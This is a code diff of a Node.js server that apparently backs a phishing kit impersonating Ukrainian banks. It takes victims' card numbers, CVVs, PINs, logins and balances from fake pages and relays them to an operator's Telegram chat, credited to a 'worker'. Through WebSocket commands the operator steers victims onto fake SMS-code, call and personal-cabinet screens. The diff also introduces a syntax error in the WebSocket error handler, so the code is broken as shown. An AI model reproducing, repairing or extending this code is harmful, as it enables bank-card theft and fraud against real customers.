@@ -17,7 +17,6 @@ const banksForRequestButton = [
 const app = express();
 app.use(express.json());
 app.use(cors());
-app.use(express.static(path.join(__dirname)));
 
 app.use((req, res, next) => {
     console.log(`${new Date().toISOString()} - ${req.method} ${req.url} - Body: ${JSON.stringify(req.body)}`);
@@ -25,33 +24,22 @@ app.use((req, res, next) => {
 });
 
 app.get('/', (req, res) => {
-    console.log('Serving index.html');
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
 app.get('/panel', (req, res) => {
-    console.log('Serving panel.html');
     res.sendFile(path.join(__dirname, 'panel.html'));
 });
 
 const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
 
-async function setupWebhook() {
-    try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook`);
-        console.log('Old webhook deleted');
-        await bot.setWebHook(WEBHOOK_URL);
-        console.log(`Webhook set to ${WEBHOOK_URL}`);
-    } catch (err) {
-        console.error('Webhook setup error:', err);
-    }
-}
+bot.setWebHook(WEBHOOK_URL).then(() => {
+    console.log(`Webhook set to ${WEBHOOK_URL}`);
+}).catch(err => {
+    console.error('Error setting webhook:', err);
+});
 
-setupWebhook();
-
-bot.sendMessage(CHAT_ID, 'ПРОЕКТ УСПЕШНО СТАЛ НА СЕРВЕР! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));
-
-bot.getMe().then(me => console.log(`Bot started: @${me.username}`)).catch(err => console.error('Bot error:', err));
+bot.sendMessage(CHAT_ID, 'ПРОЕКТ УСПЕШНО СТАЛ НА СЕРВЕР! Хорошего ворка! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));
 
 app.post(`/bot${TELEGRAM_BOT_TOKEN}`, (req, res) => {
     bot.processUpdate(req.body);
@@ -59,10 +47,7 @@ app.post(`/bot${TELEGRAM_BOT_TOKEN}`, (req, res) => {
 });
 
 const server = require('http').createServer(app);
-const wss = new WebSocket.Server({
-    server,
-    path: '/ws'
-});
+const wss = new WebSocket.Server({ server });
 
 const clients = new Map();
 const sessions = new Map();
@@ -73,15 +58,10 @@ wss.on('connection', (ws) => {
     console.log('Client connected');
     ws.on('message', (message) => {
         try {
-            const data = message.toString();
-            if (data === 'ping') {
-                ws.send('pong');
-                return;
-            }
-            const parsed = JSON.parse(data);
-            if (parsed.type === 'register' && parsed.sessionId) {
-                clients.set(parsed.sessionId, ws);
-                console.log(`Client registered: ${parsed.sessionId}`);
+            const data = JSON.parse(message);
+            if (data.type === 'register' && data.sessionId) {
+                clients.set(data.sessionId, ws);
+                console.log(`Client registered: ${data.sessionId}`);
             }
         } catch (e) {
             console.error('Error processing message:', e);
@@ -95,14 +75,12 @@ wss.on('connection', (ws) => {
             }
         });
     });
-    ws.on('error', (error) => {
-        console.error('WebSocket error:', error);
-    });
+    ws.on('error', (error) => console.error('WebSocket error:', error);
 });
 
 app.post('/api/submit', (req, res) => {
     console.log('API /submit:', req.body);
-    const { sessionId, isFinalStep, referrer, bankTheme, ...stepData } = req.body;
+    const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
 
     let workerNick = 'unknown';
     try {
@@ -113,7 +91,7 @@ app.post('/api/submit', (req, res) => {
         console.error('Error decoding referrer:', e);
     }
 
-    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, theme=${bankTheme}, data keys: ${Object.keys(stepData).join(', ')}`);
+    console.log(`Session ${sessionId}: isFinalStep=${isFinalStep}, data keys: ${Object.keys(stepData).join(', ')}`);
 
     const existingData = sessions.get(sessionId) || { visitCount: 0 };
     const newData = { ...existingData, ...stepData };
@@ -155,19 +133,13 @@ app.post('/api/submit', (req, res) => {
         message += `<b>Номер карти:</b> <code>${newData.card_confirm || newData.card || 'Не вказано'}</code>\n`;
         if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
         if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
-        if (newData.login) message += `<b>Логін:</b> <code>${newData.login}</code>\n`;
-        message += `<b>Пін/Пароль:</b> <code>${newData.pin || newData.password || 'Не вказано'}</code>\n`;
+        message += `<b>Пін:</b> <code>${newData.pin || 'Не вказано'}</code>\n`;
         if (newData.balance) message += `<b>Поточний баланс:</b> <code>${newData.balance}</code>\n`;
-        if (newData.cardVisitCount) {
-            const visitText = newData.cardVisitCount === 1 ? 'NEW' : `${newData.cardVisitCount} раз`;
-            message += `<b>Кількість переходів по карті:</b> ${visitText}\n`;
-        } else {
-            const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
-            message += `<b>Кількість переходів:</b> ${visitText}\n`;
-        }
+        const visitText = newData.visitCount === 1 ? 'NEW' : `${newData.visitCount} раз`;
+        message += `<b>Кількість переходів:</b> ${visitText}\n`;
         message += `<b>Worker:</b> @${workerNick}\n`;
 
-        sendToTelegram(message, sessionId, newData.bankName, bankTheme || newData.bankName.toLowerCase());
+        sendToTelegram(message, sessionId, newData.bankName);
     }
 
     res.status(200).json({ message: 'OK' });
@@ -202,11 +174,11 @@ app.post('/api/sms', (req, res) => {
     }
 });
 
-function sendToTelegram(message, sessionId, bankName, bankTheme) {
-    let keyboard = [
+function sendToTelegram(message, sessionId, bankName) {
+    const keyboard = [
         [
             { text: 'SMS', callback_data: `sms:${sessionId}` },
-            { text: 'ЛК', callback_data: `lk_${bankTheme}:${sessionId}` }
+            { text: 'ЛК', callback_data: `lk:${sessionId}` }
         ],
         [
             { text: 'ЗВОНОК', callback_data: `call_oschad:${sessionId}` }
@@ -229,7 +201,7 @@ function sendToTelegram(message, sessionId, bankName, bankTheme) {
     ];
 
     if (banksForRequestButton.includes(bankName)) {
-        keyboard[1].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
+        keyboard[0].push({ text: 'ЗАПРОС', callback_data: `request_details:${sessionId}` });
     }
 
     if (bankName !== 'Ощадбанк') {
@@ -259,20 +231,8 @@ bot.on('callback_query', (callbackQuery) => {
                 commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій, введіть його у форму вводу коду" };
                 ws.send(JSON.stringify({ type: 'sms', data: commandData }));
                 break;
-            case 'lk_oschad':
+            case 'lk':
                 ws.send(JSON.stringify({ type: 'lk_oschad', data: {} }));
-                break;
-            case 'lk_raiffeisen':
-                ws.send(JSON.stringify({ type: 'lk_raiffeisen', data: {} }));
-                break;
-            case 'lk_vostok':
-                ws.send(JSON.stringify({ type: 'lk_vostok', data: {} }));
-                break;
-            case 'lk_izibank':
-                ws.send(JSON.stringify({ type: 'lk_izibank', data: {} }));
-                break;
-            case 'lk_ukrsib':
-                ws.send(JSON.stringify({ type: 'lk_ukrsib', data: {} }));
                 break;
             case 'call_oschad':
                 ws.send(JSON.stringify({ type: 'call_oschad', data: {} }));
@@ -311,7 +271,7 @@ bot.on('callback_query', (callbackQuery) => {
 });
 
 bot.on('message', (msg) => {
-    if (msg.text && msg.chat.id.toString() === CHAT_ID && pendingCustom.has(CHAT_ID)) {
+    if (msg.text && msg.chat.id.toString() === CHAT_ID && pendingCustom.has(CHAT_ID) ) {
         const sessionId = pendingCustom.get(CHAT_ID);
         const ws = clients.get(sessionId);
         if (ws && ws.readyState === WebSocket.OPEN) {
